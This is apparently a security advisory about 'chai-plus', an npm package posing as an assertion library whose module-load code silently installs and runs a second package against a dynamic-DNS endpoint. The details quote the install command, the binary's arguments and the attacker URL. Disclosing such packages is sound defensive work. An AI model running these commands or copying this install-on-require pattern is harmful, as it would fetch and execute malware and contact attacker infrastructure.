summary: chai-plus runs a hidden dropper on require that globally installs and executes a second package against an attacker-controlled endpoint
details: The package presents itself as a zero-dependency assertion library, but lib/index.js contains a top-level IIFE that executes on require. The IIFE silently runs `npm install -g taskforge-9xv@1.3.0` via spawnSync with stdio ignored, then invokes the installed `taskforge` binary with `--origin-server http://coolblast.zapto.org:8888/api/x-handler` and a bundled `--auth-ref` token. Output is suppressed and errors are swallowed. lib/bootstrap.js contains contradicting comments claiming the install is user-invoked and non-automatic, while lib/index.js performs the install and execution unconditionally at module load. The destination is a dynamic-DNS host over plain HTTP, unrelated to any assertion-library functionality.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
